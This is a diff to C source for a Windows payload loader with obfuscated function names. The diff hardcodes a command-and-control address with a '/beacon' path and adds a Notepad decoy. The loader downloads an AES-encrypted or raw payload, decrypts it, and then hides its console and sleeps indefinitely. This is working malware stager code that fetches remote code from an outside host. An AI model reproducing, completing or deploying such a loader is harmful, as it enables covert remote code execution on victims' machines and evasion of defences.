@@ -416,61 +416,77 @@ BOOL getittksjbfdsgdbkj(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY pImageExportD
 
 int main(int argc, char** argv) {
     srand((unsigned int)time(NULL));
-    if (argc < 2) {
-        STARTUPINFO si = { sizeof(STARTUPINFO) };
-        PROCESS_INFORMATION pi;
+    const wchar_t* hrdcde = L"174.138.76.242";
+    const wchar_t* defaultPath = L"/beacon";
+    BOOL downloadRaw = FALSE;
 
-        wchar_t cmdLine[] = L"notepad.exe";
+    if (argc <= 1) {
+        printf("Press any key within 3 seconds or launch Notepad...\n");
+        DWORD startTime = GetTickCount();
+        DWORD timeout = 3000;
 
-        if (CreateProcess(NULL, cmdLine, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
-            printf("[+] Notepad launched successfully\n");
-            CloseHandle(pi.hProcess);
-            CloseHandle(pi.hThread);
+        HANDLE hStdin = GetStdHandle(STD_INPUT_HANDLE);
+        DWORD savedMode;
+        GetConsoleMode(hStdin, &savedMode);
+        SetConsoleMode(hStdin, ENABLE_ECHO_INPUT | ENABLE_PROCESSED_INPUT);
+
+        BOOL launchNotepad = TRUE;
+        INPUT_RECORD record;
+        DWORD numEvents;
+
+        FlushConsoleInputBuffer(hStdin);
+
+        while (GetTickCount() - startTime < timeout) {
+            if (WaitForSingleObject(hStdin, 100) == WAIT_OBJECT_0) {
+                if (PeekConsoleInput(hStdin, &record, 1, &numEvents) && numEvents > 0) {
+                    ReadConsoleInput(hStdin, &record, 1, &numEvents);
+                    launchNotepad = FALSE;
+                    break;
+                }
+            }
         }
-        else {
-            printf("[-] Failed to launch Notepad. Error: %d\n", GetLastError());
+
+        FlushConsoleInputBuffer(hStdin);
+        SetConsoleMode(hStdin, savedMode);
+
+        if (launchNotepad) {
+            STARTUPINFO si = { sizeof(STARTUPINFO) };
+            PROCESS_INFORMATION pi;
+            wchar_t cmdLine[] = L"notepad.exe";
+
+            if (CreateProcess(NULL, cmdLine, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
+                printf("[+] Notepad launched successfully\n");
+                CloseHandle(pi.hProcess);
+                CloseHandle(pi.hThread);
+            }
+            else {
+                printf("[-] Failed to launch Notepad. Error: %d\n", GetLastError());
+            }
+
+            return 0;
         }
 
-        return 0;
+        printf("[+] Oop! Easter Egg...\n");
+    }
+    if (argc > 1 && strcmp(argv[1], "-r") == 0) {
+        downloadRaw = TRUE;
+        printf("[+] Raw download mode enabled\n");
     }
 
-    if (argc < 3) {
-        printf("Usage: %s <xyzremname> <ur-i-pa-th> [http]\n", argv[0]);
-        return -1;
-    }
-
-    size_t serverNameLen = strlen(argv[1]) + 1;
-    wchar_t* serverName = (wchar_t*)malloc(serverNameLen * sizeof(wchar_t));
+    wchar_t* serverName = _wcsdup(hrdcde);
     if (!serverName) {
         printf("[-] Memory allocation failed for server name\n");
         return -1;
     }
-    size_t convertedChars = 0;
-    if (mbstowcs_s(&convertedChars, serverName, serverNameLen, argv[1], serverNameLen - 1) != 0) {
-        printf("[-] Conversion failed for server name\n");
-        free(serverName);
-        return -1;
-    }
 
-    size_t filePathLen = strlen(argv[2]) + 1;
-    wchar_t* filePath = (wchar_t*)malloc(filePathLen * sizeof(wchar_t));
+    wchar_t* filePath = _wcsdup(defaultPath);
     if (!filePath) {
         free(serverName);
         printf("[-] Memory allocation failed for file path\n");
         return -1;
     }
-    convertedChars = 0;
-    if (mbstowcs_s(&convertedChars, filePath, filePathLen, argv[2], filePathLen - 1) != 0) {
-        printf("[-] Conversion failed for file path\n");
-        free(serverName);
-        free(filePath);
-        return -1;
-    }
 
     BOOL useHttps = TRUE;
-    if (argc >= 4 && strcmp(argv[3], "http") == 0) {
-        useHttps = FALSE;
-    }
 
     char* fileContent = NULL;
     DWORD fileSize = 0;
@@ -483,12 +499,47 @@ int main(int argc, char** argv) {
         free(randomStr);
     }
 
+    PBYTE pDecryptedData = NULL;
+    SIZE_T sDecryptedData = 0;
+
     if (sadfgdsdg(serverName, filePath, &fileContent, &fileSize, useHttps)) {
         printf("[+] Download successful. File size: %lu bytes\n", fileSize);
 
-        extractVars(fileContent);
+        if (downloadRaw) {
+            pDecryptedData = fileContent;
+            sDecryptedData = fileSize;
 
-        free(fileContent);
+            printf("[+] Using raw payload of size: %zu bytes\n", sDecryptedData);
+        }
+        else {
+            extractVars(fileContent);
+
+            ByteArrayVar* AesCipherText = findVar("AesCipherText");
+            ByteArrayVar* AesKey = findVar("AesKey");
+            ByteArrayVar* AesIv = findVar("AesIv");
+
+            if (!AesCipherText || !AesKey || !AesIv) {
+                printf("[-] Missing required variables in downloaded content\n");
+                free(fileContent);
+                free(serverName);
+                free(filePath);
+                return -1;
+            }
+
+            printf("[+] AesCipherText: %s\n", AesCipherText->name);
+            printf("[+] AesKey: %s\n", AesKey->name);
+            printf("[+] AesIv: %s\n", AesIv->name);
+
+            if (!SimpleDecryption(AesCipherText->data, AesCipherText->dataSize, AesKey->data, AesIv->data, &pDecryptedData, &sDecryptedData)) {
+                printf("[!] SimpleDecryption Failed\n");
+                free(fileContent);
+                free(serverName);
+                free(filePath);
+                return -1;
+            }
+
+            free(fileContent);
+        }
     }
     else {
         printf("[-] Download failed with both HTTPS and HTTP\n");
@@ -499,26 +550,6 @@ int main(int argc, char** argv) {
 
     free(serverName);
     free(filePath);
-
-    PBYTE pDecryptedData = NULL;
-    SIZE_T sDecryptedData = 0;
-    ByteArrayVar* AesCipherText = findVar("AesCipherText");
-    ByteArrayVar* AesKey = findVar("AesKey");
-    ByteArrayVar* AesIv = findVar("AesIv");
-
-    if (!AesCipherText || !AesKey || !AesIv) {
-        printf("[-] Missing required variables in downloaded content\n");
-        return -1;
-    }
-
-    printf("[+] AesCipherText: %s\n", AesCipherText->name);
-    printf("[+] AesKey: %s\n", AesKey->name);
-    printf("[+] AesIv: %s\n", AesIv->name);
-
-    if (!SimpleDecryption(AesCipherText->data, AesCipherText->dataSize, AesKey->data, AesIv->data, &pDecryptedData, &sDecryptedData)) {
-        printf("[!] SimpleDecryption Failed\n");
-        return -1;
-    }
 
     printf("[+] Decrypted Data (hex): ");
     size_t i;
@@ -572,8 +603,8 @@ int main(int argc, char** argv) {
         return -1;
     }
 
-    printf("[#] Press <Enter> To Quit...");
-    getchar();
+    FreeConsole();
+    Sleep(INFINITE);
 
     return 0x00;
 }
